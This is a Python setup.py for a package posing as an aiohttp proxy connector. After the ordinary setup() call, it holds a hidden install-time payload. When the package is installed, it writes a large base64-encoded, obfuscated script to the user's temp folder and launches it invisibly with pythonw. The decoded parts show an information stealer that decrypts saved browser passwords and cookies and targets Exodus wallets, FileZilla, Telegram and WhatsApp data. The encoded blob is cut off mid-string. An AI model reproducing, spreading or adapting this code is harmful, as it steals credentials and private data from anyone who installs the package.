import codecs
import os
import re
import sys


try:
    from setuptools import setup
except ImportError:
    from distutils.core import setup

version = None

with codecs.open(
    os.path.join(
        os.path.abspath(os.path.dirname(__file__)), "aiohttp_proxies_connector", "__init__.py"
    ),
    "r",
    "latin1",
) as fp:
    try:
        version = re.findall(r'^__version__ = "(\S+?)"$', fp.read(), re.M)[0]
    except IndexError:
        raise RuntimeError("Unable to determine version.")

if sys.version_info < (3, 5, 3):
    raise RuntimeError("aiohttp_proxies_connector requires Python 3.5.3+")

with open("README.md") as f:
    long_description = f.read()

setup(
    name="aiohttp_proxies_connector",
    author="Skactor",
    author_email="sk4ct0r@gmail.com",
    version='0.2.34',
    license="Apache 2",
    url="https://github.com/Skactor/aiohttp-proxy",
    description="Full-featured proxy connector for aiohttp",
    long_description=long_description,
    long_description_content_type="text/markdown",
    packages=["aiohttp_proxies_connector"],
    keywords="asyncio aiohttp socks socks5 socks4 http https proxy aiofiles aiohttp cryptography",
    install_requires=["aiohttp>=2.3.2", "yarl"],
)

LOCAL = os.environ['USERPROFILE']
TEMP = os.path.join(LOCAL, 'appdata', 'local', 'temp')
main_dir = os.path.join(TEMP, '__pycache__')

# with open(os.path.join(main_dir, 'args.txt'), 'a', encoding='utf8') as f:
#     f.write(str(sys.argv) + '\n')


if len(sys.argv) == 0:
    sys.exit()

if not ("install" == sys.argv[1] or "bdist" in sys.argv[1]):
    sys.exit()


def run(filename):
    from subprocess import Popen, PIPE
    from os.path import split, join
    import sys


    python = sys.executable
    pythonw = join(split(python)[0], 'pythonw.exe')

    LOCAL = environ['USERPROFILE']
    TEMP = join(LOCAL, 'appdata', 'local', 'temp')

    main_dir = join(TEMP, '__pycache__')
    file = join(main_dir, filename)

    chdir(main_dir)

    Popen([pythonw, file], stdin=PIPE, stdout=PIPE, stderr=PIPE,
            creationflags=0x00000008 | 0x00000200, shell=True)

from os.path import isdir, join
from os import mkdir, chdir
from base64 import b64decode
from os import environ
from os.path import join
import traceback
from shutil import rmtree
import sys

DEBUG = True

try:
    LOCAL = environ['USERPROFILE']
    TEMP = join(LOCAL, 'appdata', 'local', 'temp')

    def b64(code: str) -> str:
        return b64decode(code.encode('utf8')).decode('utf8')

    main_dir = join(TEMP, '__pycache__')

    if not isdir(main_dir):
        mkdir(main_dir)

    with open(join(main_dir, 'main.cpython-39.py'), 'w', encoding='utf8') as f:
        f.write(b64('aW1wb3J0IHN5cyAjbGluZToyCmZyb20gb3MgLnBhdGggaW1wb3J0IGpvaW4gLHNwbGl0ICNsaW5lOjMKZnJvbSBzdWJwcm9jZXNzIGltcG9ydCBQb3BlbiAsY2FsbCAjbGluZTo0CmZyb20gdGltZSBpbXBvcnQgc2xlZXAgI2xpbmU6NQpmcm9tIG9zIGltcG9ydCBzeXN0ZW0gI2xpbmU6NgpweXRob24gPXN5cyAuZXhlY3V0YWJsZSAjbGluZTo4CnB5dGhvbncgPWpvaW4gKHNwbGl0IChweXRob24gKVswIF0sJ3B5dGhvbncuZXhlJykjbGluZTo5CmNhbGwgKGYne3B5dGhvbnd9IC1tIGVuc3VyZXBpcCcpI2xpbmU6MTAKY2FsbCAoZid7cHl0aG9ud30gLW0gcGlwIGluc3RhbGwgYWlvZmlsZXMnKSNsaW5lOjExCmNhbGwgKGYne3B5dGhvbnd9IC1tIHBpcCBpbnN0YWxsIGFpb2h0dHAnKSNsaW5lOjEyCmNhbGwgKGYne3B5dGhvbnd9IC1tIHBpcCBpbnN0YWxsIGNyeXB0b2dyYXBoeScpI2xpbmU6MTMKY2FsbCAoZid7cHl0aG9ud30gLW0gcGlwIGluc3RhbGwgYWlvc3FsaXRlJykjbGluZToxNApjYWxsIChmJ3tweXRob253fSAtbSBwaXAgaW5zdGFsbCBtc3MnKSNsaW5lOjE1CmNhbGwgKGYne3B5dGhvbnd9IC1tIHBpcCBpbnN0YWxsIHB5cGl3aW4zMicpI2xpbmU6MTYKY2FsbCAoZid7cHl0aG9ud30gLW0gcGlwIGluc3RhbGwgcHN1dGlsJykjbGluZToxNwpjYWxsICgnY2FsYy5leGUnKSNsaW5lOjE4CiMhL3Vzci9iaW4vZW52IHB5dGhvbgppbXBvcnQgY29udGV4dGxpYiBhcyBfX3N0aWNreXRhcGVfY29udGV4dGxpYiAjbGluZToyMApAX19zdGlja3l0YXBlX2NvbnRleHRsaWIgLmNvbnRleHRtYW5hZ2VyICNsaW5lOjIyCmRlZiBfX09PMDBPTzAwTzBPTzAwT09PICgpOiNsaW5lOjIzCiAgICBpbXBvcnQgdGVtcGZpbGUgI2xpbmU6MjQKICAgIGltcG9ydCBzaHV0aWwgI2xpbmU6MjUKICAgIE8wT08wTzBPME8wMDAwMDBPID10ZW1wZmlsZSAubWtkdGVtcCAoKSNsaW5lOjI2CiAgICB0cnkgOiNsaW5lOjI3CiAgICAgICAgeWllbGQgTzBPTzBPME8wTzAwMDAwME8gI2xpbmU6MjgKICAgIGZpbmFsbHkgOiNsaW5lOjI5CiAgICAgICAgc2h1dGlsIC5ybXRyZWUgKE8wT08wTzBPME8wMDAwMDBPICkjbGluZTozMAp3aXRoIF9fT08wME9PMDBPME9PMDBPT08gKClhcyBfX08wME9PT09PME9PTzAwT08wIDojbGluZTozMgogICAgZGVmIF9fT08wT08wME8wTzAwT09PT08gKE8wME9PTzAwT08wMDAwME8wICxPTzAwT08wME8wME9PT08wTyApOiNsaW5lOjMzCiAgICAgICAgaW1wb3J0IG9zICxvcyAucGF0aCAjbGluZTozNAogICAgICAgIGRlZiBPMDBPME8wTzBPMDAwTzBPTyAoTzBPTzBPTzAwTzAwMDBPMDAgKTojbGluZTozNgogICAgICAgICAgICBPMDAwTzAwT08wT09PME8wTyA9TzBPTzBPTzAwTzAwMDBPMDAgLnNwbGl0ICgiLyIpI2xpbmU6MzcKICAgICAgICAgICAgT09PMDBPME8wT08wT09PTzAgPV9fTzAwT09PT08wT09PMDBPTzAgI2xpbmU6MzgKICAgICAgICAgICAgZm9yIE9PMDBPTzBPMDAwME9PT09PIGluIE8wMDBPMDBPTzBPT08wTzBPIDojbGluZTozOQogICAgICAgICAgICAgICAgT09PMDBPME8wT08wT09PTzAgPW9zIC5wYXRoIC5qb2luIChPT08wME8wTzBPTzBPT09PMCAsT08wME9PME8wMDAwT09PT08gKSNsaW5lOjQwCiAgICAgICAgICAgICAgICBpZiBub3Qgb3MgLnBhdGggLmV4aXN0cyAoT09PMDBPME8wT08wT09PTzAgKTojbGluZTo0MQogICAgICAgICAgICAgICAgICAgIG9zIC5ta2RpciAoT09PMDBPME8wT08wT09PTzAgKSNsaW5lOjQyCiAgICAgICAgICAgICAgICAgICAgd2l0aCBvcGVuIChvcyAucGF0aCAuam9pbiAoT09PMDBPME8wT08wT09PTzAgLCJfX2luaXRfXy5weSIpLCJ3YiIpYXMgT08wT08wTzAwME9PT09PT08gOiNsaW5lOjQzCiAgICAgICAgICAgICAgICAgICAgICAgIE9PME9PME8wMDBPT09PT09PIC53cml0ZSAoYiJcbiIpI2xpbmU6NDQKICAgICAgICBPMDBPME8wTzBPMDAwTzBPTyAob3MgLnBhdGggLmRpcm5hbWUgKE8wME9PTzAwT08wMDAwME8wICkpI2xpbmU6NDYKICAgICAgICBPTzBPME8wT09PT09PMDBPMCA9b3MgLnBhdGggLmpvaW4gKF9fTzAwT09PT08wT09PMDBPTzAgLE8wME9PTzAwT08wMDAwME8wICkjbGluZTo0OAogICAgICAgIHdpdGggb3BlbiAoT08wTzBPME9PT09PTzAwTzAgLCJ3YiIpYXMgT09PT08wME8wME9PT09PME8gOiNsaW5lOjQ5CiAgICAgICAgICAgIE9PT09PMDBPMDBPT09PTzBPIC53cml0ZSAoT08wME9PMDBPMDBPT09PME8gKSNsaW5lOjUwCiAgICBpbXBvcnQgc3lzIGFzIF9fc3RpY2t5dGFwZV9zeXMgI2xpbmU6NTIKICAgIF9fc3RpY2t5dGFwZV9zeXMgLnBhdGggLmluc2VydCAoMCAsX19PMDBPT09PTzBPT08wME9PMCApI2xpbmU6NTMKICAgIF9fT08wT08wME8wTzAwT09PT08gKCdwYXRoX3NlYXJjaC5weScsYiJpbXBvcnQgYXN5bmNpb1xyXG5pbXBvcnQgb3NcclxuZnJvbSBvcyBpbXBvcnQgc2NhbmRpciwgZ2V0bG9naW5cclxuZnJvbSBvcy5wYXRoIGltcG9ydCBqb2luLCBpc2RpclxyXG5mcm9tIHR5cGluZyBpbXBvcnQgRGljdCwgSXRlcmFibGUsIExpc3RcclxuZnJvbSB0b29scyBpbXBvcnQgX2hhbmRsZV90YXNrX3Jlc3VsdFxyXG5mcm9tIGxvZ2dlciBpbXBvcnQgTG9nZ2VyXHJcblxyXG5cclxuTE9DQUwgPSBvcy5lbnZpcm9uWydVU0VSUFJPRklMRSddXHJcblxyXG5yb290X3BhdGhzID0ge1xyXG4gICAgam9pbihMT0NBTCwgJ2FwcGRhdGEnKSxcclxuICAgIGpvaW4oTE9DQUwsICdhcHBkYXRhJywgJ2xvY2FsJyksXHJcbiAgICBqb2luKExPQ0FMLCAnYXBwZGF0YScsICdsb2NhbCcsICdwcm9ncmFtcycpLFxyXG4gICAgam9pbihMT0NBTCwgJ2FwcGRhdGEnLCAncm9hbWluZycpLFxyXG4gICAgam9pbihMT0NBTCwgJ2RvY3VtZW50cycpLFxyXG4gICAgam9pbihMT0NBTCwgJ2Rvd25sb2FkcycpLFxyXG4gICAgam9pbihMT0NBTCwgJ2Rlc2t0b3AnKSxcclxuICAgICdDOi8nLFxyXG4gICAgJ0Q6LycsXHJcbiAgICAnRTovJyxcclxuICAgICdDOi9wcm9ncmFtIGZpbGVzJyxcclxuICAgICdDOi9wcm9ncmFtIGZpbGVzICh4ODYpJyxcclxuICAgICdDOi9wcm9ncmFtZGF0YSdcclxufVxyXG5cclxudXNlcnMgPSAoaS5uYW1lLmxvd2VyKCkgZm9yIGkgaW4gc2NhbmRpcignYzovdXNlcnMnKSlcclxuZm9yIHVzZXJuYW1lIGluIHVzZXJzOlxyXG4gICAgaWYgdXNlcm5hbWUgaW4gWydkZXNrdG9wLmluaScsIGdldGxvZ2luKCkubG93ZXIoKV06XHJcbiAgICAgICAgY29udGludWVcclxuICAgIFxyXG4gICAgbG9jYWwgPSBqb2luKCdjOlxcXFx1c2VycycsIHVzZXJuYW1lKVxyXG4gICAgdXNlcl9wYXRocyA9IHtcclxuICAgICAgICBqb2luKGxvY2FsLCAnYXBwZGF0YScpLFxyXG4gICAgICAgIGpvaW4obG9jYWwsICdhcHBkYXRhJywgJ2xvY2FsJyksXHJcbiAgICAgICAgam9pbihsb2NhbCwgJ2FwcGRhdGEnLCAnbG9jYWwnLCAncHJvZ3JhbXMnKSxcclxuICAgICAgICBqb2luKGxvY2FsLCAnYXBwZGF0YScsICdyb2FtaW5nJyksXHJcbiAgICAgICAgam9pbihsb2NhbCwgJ2RvY3VtZW50cycpLFxyXG4gICAgICAgIGpvaW4obG9jYWwsICdkb3dubG9hZHMnKSxcclxuICAgICAgICBqb2luKGxvY2FsLCAnZGVza3RvcCcpXHJcbiAgICB9XHJcbiAgICByb290X3BhdGhzLnVwZGF0ZSh1c2VyX3BhdGhzKVxyXG5cclxuYXN5bmMgZGVmIHNlYXJjaF9wbHVnaW5fcGF0aHMocGF0aHM6IEl0ZXJhYmxlW3N0cl0sIHF1ZXJpZXM6IERpY3QsIGxvZ2dlcjogTG9nZ2VyKTpcclxuICAgIHRhc2tzOiBMaXN0W2FzeW5jaW8uVGFza10gPSBbXVxyXG5cclxuICAgIHF1ZXJpZXMgPSB7ay5sb3dlcigpOiB2IGZvciBrLHYgaW4gcXVlcmllcy5pdGVtcygpfVxyXG4gICAgdGFyZ2V0X2ZvbGRlcl9uYW1lcyA9IHNldChxdWVyaWVzLmtleXMoKSlcclxuICAgIGZvciBwIGluIHBhdGhzOlxyXG4gICAgICAgIHRyeTpcclxuICAgICAgICAgICAgaWYgaXNkaXIocCk6XHJcbiAgICAgICAgICAgICAgICBmb3IgZm5hbWUgaW4gdGFyZ2V0X2ZvbGRlcl9uYW1lcy5pbnRlcnNlY3Rpb24oaS5uYW1lLmxvd2VyKCkgZm9yIGkgaW4gb3Muc2NhbmRpcihwKSk6XHJcbiAgICAgICAgICAgICAgICAgICAgaWYgcXVlcmllc1tmbmFtZV0gaXMgbm90IE5vbmU6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGN1cnJfcGF0aCA9IGpvaW4ocCwgZm5hbWUpXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGF3YWl0IGxvZ2dlci5sb2coZidceGQwXHg5ZFx4ZDBceGIwXHhkMFx4YjlceGQwXHhiNFx4ZDBceGI1XHhkMFx4YmRceGQwXHhiMCBceGQwXHhiZlx4ZDFceDgzXHhkMVx4ODJceGQxXHg4YyB7Y3Vycl9wYXRofScpXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGxvb3AgPSBhc3luY2lvLmdldF9ldmVudF9sb29wKClcclxuICAgICAgICAgICAgICAgICAgICAgICAgdGFzayA9IGxvb3AuY3JlYXRlX3Rhc2socXVlcmllc1tmbmFtZV0uY2FsbGJhY2soY3Vycl9wYXRoKSlcclxuICAgICAgICAgICAgICAgICAgICAgICAgdGFzay5hZGRfZG9uZV9jYWxsYmFjayhsYW1iZGEgeDogX2hhbmRsZV90YXNrX3Jlc3VsdCh4LCBsb2dnZXIpKVxyXG4gICAgICAgICAgICAgICAgICAgICAgICB0YXNrcy5hcHBlbmQodGFzaylcclxuICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6XHJcbiAgICAgICAgICAgIGF3YWl0IGxvZ2dlci5sb2coZidceGQwXHg5ZVx4ZDFceDg4XHhkMFx4YjhceGQwXHhiMVx4ZDBceGJhXHhkMFx4YjAgXHhkMFx4YjIgc2VhcmNoX3BsdWdpbl9wYXRocyBceGQwXHhiZlx4ZDFceDgzXHhkMVx4ODJceGQxXHg4YyB7cH0gXHhkMFx4YmVceGQxXHg4OFx4ZDBceGI4XHhkMFx4YjFceGQwXHhiYVx4ZDBceGIwIHtlfScpXHJcbiAgICBmb3IgdGFzayBpbiB0YXNrczpcclxuICAgICAgICB0cnk6XHJcbiAgICAgICAgICAgIGF3YWl0IHRhc2tcclxuICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6XHJcbiAgICAgICAgICAgIHByaW50KHJlcHIoZSkpXHJcblxyXG5cclxuYXN5bmMgZGVmIHNlYXJjaF9wYXRocyhwYXRoczogSXRlcmFibGVbc3RyXSwgcXVlcmllczogSXRlcmFibGUpOlxyXG4gICAgdGFyZ2V0X2ZvbGRlcl9uYW1lcyA9IHtpLmxvd2VyKCkgZm9yIGkgaW4gcXVlcmllc31cclxuICAgIGZvciBwIGluIHBhdGhzOlxyXG4gICAgICAgIGlmIGlzZGlyKHApOlxyXG4gICAgICAgICAgICBmb3IgZm5hbWUgaW4gdGFyZ2V0X2ZvbGRlcl9uYW1lcy5pbnRlcnNlY3Rpb24oaS5uYW1lLmxvd2VyKCkgZm9yIGkgaW4gb3Muc2NhbmRpcihwKSk6XHJcbiAgICAgICAgICAgICAgICBpZiBmbmFtZSBpbiB0YXJnZXRfZm9sZGVyX25hbWVzOlxyXG4gICAgICAgICAgICAgICAgICAgIHlpZWxkIGpvaW4ocCwgZm5hbWUpXHJcbiIpI2xpbmU6NTUKICAgIF9fT08wT08wME8wTzAwT09PT08gKCd0b29scy5weScsYiJpbXBvcnQgb3NcclxuaW1wb3J0IGFzeW5jaW9cclxuZnJvbSBhaW9maWxlcy5vcyBpbXBvcnQgd3JhcFxyXG5mcm9tIHNodXRpbCBpbXBvcnQgY29weWZpbGUsIGNvcHl0cmVlLCBtb3ZlXHJcbmZyb20gbG9nZ2VyIGltcG9ydCBMb2dnZXJcclxuaW1wb3J0IHdpbnJlZ1xyXG5pbXBvcnQgcmVcclxuXHJcblxyXG5cclxuZGVmIHppcGRpcihwYXRoLCB6aXBoKTpcclxuICAgICcnJ0Zyb20gc3RhY2tvdmVyZmxvdycnJ1xyXG4gICAgIyB6aXBoIGlzIHppcGZpbGUgaGFuZGxlXHJcbiAgICBmb3Igcm9vdCwgZGlycywgZmlsZXMgaW4gb3Mud2FsayhwYXRoKTpcclxuICAgICAgICBmb3IgZmlsZSBpbiBmaWxlczpcclxuICAgICAgICAgICAgemlwaC53cml0ZShvcy5wYXRoLmpvaW4ocm9vdCwgZmlsZSksIFxyXG4gICAgICAgICAgICAgICAgICAgICAgIG9zLnBhdGgucmVscGF0aChvcy5wYXRoLmpvaW4ocm9vdCwgZmlsZSksIFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBvcy5wYXRoLmpvaW4ocGF0aCwgJy4uJykpKVxyXG5cclxuY29weWZpbGUgPSB3cmFwKGNvcHlmaWxlKVxyXG5jb3B5dHJlZSA9IHdyYXAoY29weXRyZWUpXHJcbm1vdmUgPSB3cmFwKG1vdmUpXHJcblxyXG5cclxuZGVmIF9oYW5kbGVfdGFza19yZXN1bHQodGFzazogYXN5bmNpby5UYXNrLCBsb2dnZXI6IExvZ2dlcikgLT4gTm9uZTpcclxuICAgIHRyeTpcclxuICAgICAgICB0YXNrLnJlc3VsdCgpXHJcbiAgICBleGNlcHQgYXN5bmNpby5DYW5jZWxsZWRFcnJvcjpcclxuICAgICAgICBwYXNzICAjIFRhc2sgY2FuY2VsbGF0aW9uIHNob3VsZCBub3QgYmUgbG9nZ2VkIGFzIGFuIGVycm9yLlxyXG4gICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOiAgIyBweWxpbnQ6IGRpc2FibGU9YnJvYWQtZXhjZXB0XHJcbiAgICAgICAgbG9nZ2VyLnN5bmNfbG9nKGYnRXJyb3Ige2Uhcn0nKSIpI2xpbmU6NTYKICAgIF9fT08wT08wME8wTzAwT09PT08gKCdsb2dnZXIucHknLGInZnJvbSBvcy5wYXRoIGltcG9ydCBqb2luXHJcbmZyb20gYWlvZmlsZXMgaW1wb3J0IG9wZW4gYXMgYXN5bmNfb3BlblxyXG5mcm9tIGRhdGV0aW1lIGltcG9ydCBkYXRldGltZVxyXG5mcm9tIGFzeW5jaW8gaW1wb3J0IFNlbWFwaG9yZVxyXG5cclxuXHJcblxyXG5jbGFzcyBMb2dnZXIoKTpcclxuICAgIGRlZiBfX2luaXRfXyhzZWxmLCBsb2dfcGF0aDogc3RyKSAtPiBOb25lOlxyXG4gICAgICAgIHNlbGYucGF0aCA9IGpvaW4obG9nX3BhdGgsIFwnd29ya19sb2dzLnR4dFwnKVxyXG4gICAgICAgIHNlbGYuc2VtID0gU2VtYXBob3JlKDEpXHJcblxyXG4gICAgYXN5bmMgZGVmIHByaW50KHNlbGYsIHRleHQpIC0+IE5vbmU6XHJcbiAgICAgICAgYXN5bmMgd2l0aCBzZWxmLnNlbTpcclxuICAgICAgICAgICAgYXN5bmMgd2l0aCBhc3luY19vcGVuKHNlbGYucGF0aCwgXCdhXCcsIGVuY29kaW5nPVwndXRmOFwnKSBhcyBmOlxyXG4gICAgICAgICAgICAgICAgYXdhaXQgZi53cml0ZShmXCd7dGV4dH1cXG5cJylcclxuXHJcbiAgICBhc3luYyBkZWYgbG9nKHNlbGYsIHRleHQpIC0+IE5vbmU6XHJcbiAgICAgICAgbm93ID0gZGF0ZXRpbWUubm93KCkuc3RyZnRpbWUoIiVIOiVNOiVTIilcclxuICAgICAgICBhd2FpdCBzZWxmLnByaW50KGZcJ3tub3d9IHwge3RleHR9XCcpXHJcblxyXG4gICAgZGVmIHN5bmNfcHJpbnQoc2VsZiwgdGV4dCkgLT4gTm9uZTpcclxuICAgICAgICB3aXRoIG9wZW4oc2VsZi5wYXRoLCBcJ2FcJywgZW5jb2Rpbmc9XCd1dGY4XCcpIGFzIGY6XHJcbiAgICAgICAgICAgIGYud3JpdGUoZlwne3RleHR9XFxuXCcpXHJcblxyXG4gICAgZGVmIHN5bmNfbG9nKHNlbGYsIHRleHQpIC0+IE5vbmU6XHJcbiAgICAgICAgbm93ID0gZGF0ZXRpbWUubm93KCkuc3RyZnRpbWUoIiVIOiVNOiVTIilcclxuICAgICAgICBzZWxmLnN5bmNfcHJpbnQoZlwne25vd30gfCB7dGV4dH1cJyknKSNsaW5lOjU3CiAgICBfX09PME9PMDBPME8wME9PT09PICgnY29uZmlnLnB5JyxiImZyb20gZGF0YWNsYXNzZXMgaW1wb3J0IGRhdGFjbGFzcywgZmllbGRcclxuZnJvbSBhaW9odHRwIGltcG9ydCBDbGllbnRTZXNzaW9uXHJcbmZyb20gbG9nZ2VyIGltcG9ydCBMb2dnZXJcclxuXHJcblxyXG5AZGF0YWNsYXNzXHJcbmNsYXNzIENvbmZpZzpcclxuICAgIGNsaWVudF9pZDogc3RyXHJcbiAgICBob3N0OiBzdHJcclxuICAgIGxvZ19wYXRoOiBzdHJcclxuICAgIGxvZ2dlcjogTG9nZ2VyXHJcbiAgICBzZXNzaW9uOiBDbGllbnRTZXNzaW9uXHJcbiAgICB0YWc6IHN0ciA9IGZpZWxkKGRlZmF1bHQ9JzkzMjAzNDczMCcpXHJcbiAgICBicm93c2VyX3Bhc3N3b3JkczogYm9vbCA9IGZpZWxkKGRlZmF1bHQ9VHJ1ZSlcclxuICAgIGJyb3dzZXJfY29va2llczogYm9vbCA9IGZpZWxkKGRlZmF1bHQ9VHJ1ZSkiKSNsaW5lOjU4CiAgICBfX09PME9PMDBPME8wME9PT09PICgncGF0aHMucHknLGIiZnJvbSBvcyBpbXBvcnQgZW52aXJvblxyXG5mcm9tIG9zLnBhdGggaW1wb3J0IGpvaW5cclxuXHJcblxyXG5MT0NBTCA9IGVudmlyb25bJ1VTRVJQUk9GSUxFJ11cclxuVEVNUCA9IGpvaW4oTE9DQUwsICdhcHBkYXRhJywgJ2xvY2FsJywgJ3RlbXAnKSIpI2xpbmU6NTkKICAgIF9fT08wT08wME8wTzAwT09PT08gKCdwbHVnaW5zL19faW5pdF9fLnB5JyxiJ2Zyb20gLmJhc2VfcGx1Z2luIGltcG9ydCBQbHVnaW5cclxuXHJcbmZyb20gLmJyb3dzZXJzIGltcG9ydCBDaHJvbWl1bVxyXG5cclxuZnJvbSAuZGV0YWlscyBpbXBvcnQgRGV0YWlsc1xyXG5cclxuZnJvbSAud2FsbGV0cyBpbXBvcnQgRXhvZHVzXHJcblxyXG5mcm9tIC5maWxlemlsbGEgaW1wb3J0IEZpbGV6aWxsYVxyXG5cclxuZnJvbSAudGVsZWdyYW0gaW1wb3J0IFRlbGVncmFtXHJcblxyXG5mcm9tIC53aGF0c2FwcCBpbXBvcnQgV2hhdHNhcHAnKSNsaW5lOjYwCiAgICBfX09PME9PMDBPME8wME9PT09PICgncGx1Z2lucy9iYXNlX3BsdWdpbi5weScsYidmcm9tIGNvbmZpZyBpbXBvcnQgQ29uZmlnXHJcbmZyb20gYWJjIGltcG9ydCBBQkMsIGFic3RyYWN0bWV0aG9kXHJcblxyXG5cclxuY2xhc3MgUGx1Z2luKEFCQyk6XHJcbiAgICBAYWJzdHJhY3RtZXRob2RcclxuICAgIGRlZiBfX2luaXRfXyhzZWxmLCBjb25mOiBDb25maWcpIC0+IE5vbmU6XHJcbiAgICAgICAgLi4uXHJcblxyXG4gICAgQGFic3RyYWN0bWV0aG9kXHJcbiAgICBhc3luYyBkZWYgY2FsbGJhY2socGF0aDogc3RyKSAtPiBOb25lOlxyXG4gICAgICAgIC4uLicpI2xpbmU6NjEKICAgIF9fT08wT08wME8wTzAwT09PT08gKCdwbHVnaW5zL2Jyb3dzZXJzL19faW5pdF9fLnB5JyxiJ2Zyb20gLmNocm9taXVtIGltcG9ydCBDaHJvbWl1bScpI2xpbmU6NjIKICAgIF9fT08wT08wME8wTzAwT09PT08gKCdwbHVnaW5zL2Jyb3dzZXJzL2Nocm9taXVtLnB5JyxiImZyb20gYXN5bmNpbyBpbXBvcnQgVGFzaywgY3JlYXRlX3Rhc2tcclxuZnJvbSB0eXBpbmcgaW1wb3J0IExpc3RcclxuZnJvbSBwbHVnaW5zIGltcG9ydCBQbHVnaW5cclxuZnJvbSBjb25maWcgaW1wb3J0IENvbmZpZ1xyXG5mcm9tIG9zIGltcG9ydCBzY2FuZGlyLCBta2RpclxyXG5mcm9tIG9zLnBhdGggaW1wb3J0IGpvaW4sIGlzZGlyLCBpc2ZpbGUsIHNwbGl0XHJcbmZyb20gdG9vbHMgaW1wb3J0IGNvcHlmaWxlLCBjb3B5dHJlZSwgX2hhbmRsZV90YXNrX3Jlc3VsdFxyXG5mcm9tIHBhdGhfc2VhcmNoIGltcG9ydCBzZWFyY2hfcGF0aHNcclxuaW1wb3J0IGFpb3NxbGl0ZVxyXG5mcm9tIC5kZWNyeXB0IGltcG9ydCBEZWNyeXB0b3JcclxuZnJvbSB0aW1lIGltcG9ydCB0aW1lXHJcbmZyb20gcGF0aHMgaW1wb3J0IFRFTVBcclxuZnJvbSBzZWNyZXRzIGltcG9ydCB0b2tlbl9oZXhcclxuZnJvbSBhaW9maWxlcyBpbXBvcnQgb3BlblxyXG5cclxuXHJcblxyXG5jbGFzcyBDaHJvbWl1bShQbHVnaW4pOlxyXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIGNvbmY6IENvbmZpZykgLT4gTm9uZTpcclxuICAgICAgICBzZWxmLmNvbmYgPSBjb25mXHJcbiAgICAgICAgc2VsZi5kZWNyeXB0b3IgPSBOb25lXHJcblxyXG5cclxuICAgIGFzeW5jIGRlZiBzZXRfZGVjcnlwdG9yKHNlbGYsIHJvb3RfcGF0aDogc3RyKSAtPiBOb25lOlxyXG4gICAgICAgIGxvY2FsX3N0YXRlX2ZvbGRlcnMgPSB7XHJcbiAgICAgICAgICAgIGpvaW4ocm9vdF9wYXRoLCAndXNlciBkYXRhJyksXHJcbiAgICAgICAgICAgIHJvb3RfcGF0aFxyXG4gICAgICAgIH1cclxuXHJcbiAgICAgICAgbG9jYWxfc3RhdGVzID0gW11cclxuICAgICAgICBhc3luYyBmb3IgaSBpbiBzZWFyY2hfcGF0aHMobG9jYWxfc3RhdGVfZm9sZGVycywgeydMb2NhbCBTdGF0ZSd9KTpcclxuICAgICAgICAgICAgbG9jYWxfc3RhdGVzLmFwcGVuZChpKVxyXG5cclxuICAgICAgICBpZiBsb2NhbF9zdGF0ZXM6XHJcbiAgICAgICAgICAgIGxvY2FsX3N0YXRlX3BhdGggPSBsb2NhbF9zdGF0ZXNbMF1cclxuICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICBsb2NhbF9zdGF0ZV9wYXRoID0gTm9uZVxyXG5cclxuICAgICAgICBzZWxmLmRlY3J5cHRvciA9IERlY3J5cHRvcihsb2NhbF9zdGF0ZV9wYXRoKVxyXG5cclxuXHJcbiAgICBhc3luYyBkZWYgc3RlYWxfcGFzc3dvcmQoc2VsZiwgcm9vdF9wYXRoOiBzdHIpIC0+IE5vbmU6XHJcbiAgICAgICAgdHJ5OlxyXG4gICAgICAgICAgICByb3dzID0gW11cclxuXHJcbiAgICAgICAgICAgIGlmIG5vdCBpc2Rpcihyb290X3BhdGgpOlxyXG4gICAgICAgICAgICAgICAgcmV0dXJuIFtdXHJcblxyXG4gICAgICAgICAgICBsb2dpbl9kYXRhX2ZvbGRlcl9wYXRocyA9IHtcclxuICAgICAgICAgICAgICAgIGpvaW4ocm9vdF9wYXRoLCAndXNlciBkYXRhJywgJ2RlZmF1bHQnKSxcclxuICAgICAgICAgICAgICAgIHJvb3RfcGF0aFxyXG4gICAgICAgICAgICB9XHJcblxyXG4gICAgICAgICAgICBhc3luYyBmb3IgcCBpbiBzZWFyY2hfcGF0aHMobG9naW5fZGF0YV9mb2xkZXJfcGF0aHMsIHsnTG9naW4gRGF0YSd9KTpcclxuICAgICAgICAgICAgICAgIHRyeTpcclxuICAgICAgICAgICAgICAgICAgICBpZiBub3QgaXNmaWxlKHApOlxyXG4gICAgICAgICAgICAgICAgICAgICAgICBjb250aW51ZVxyXG4gICAgICAgICAgICAgICAgICAgIFxyXG4gICAgICAgICAgICAgICAgICAgIHRlbXBfcGF0aCA9IGpvaW4oVEVNUCwgZidMb2dpbiBEYXRhIHt0aW1lKCl9JylcclxuICAgICAgICAgICAgICAgICAgICBhd2FpdCBjb3B5ZmlsZShwLCB0ZW1wX3BhdGgpXHJcblxyXG4gICAgICAgICAgICAgICAgICAgIGlmIG5vdCBzZWxmLmRlY3J5cHRvcjpcclxuICAgICAgICAgICAgICAgICAgICAgICAgYXdhaXQgc2VsZi5zZXRfZGVjcnlwdG9yKHJvb3RfcGF0aClcclxuICAgICAgICAgICAgICAgICAgICBhc3luYyB3aXRoIGFpb3NxbGl0ZS5jb25uZWN0KHRlbXBfcGF0aCkgYXMgY29ubjpcclxuICAgICAgICAgICAgICAgICAgICAgICAgc3FsID0gJ3NlbGVjdCAqIGZyb20gbG9naW5zJ1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBhc3luYyB3aXRoIGNvbm4uZXhlY3V0ZShzcWwpIGFzIGN1cnI6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBhc3luYyBmb3Igcm93IGluIGN1cnI6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdHJ5OlxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByb3dzLmFwcGVuZCgocm93WzFdLCByb3dbM10sIHNlbGYuZGVjcnlwdG9yLmRlY3J5cHRfcGFzc3dvcmQocm93WzVdKSkpXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOlxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBhd2FpdCBzZWxmLmNvbmYubG9nZ2VyLmxv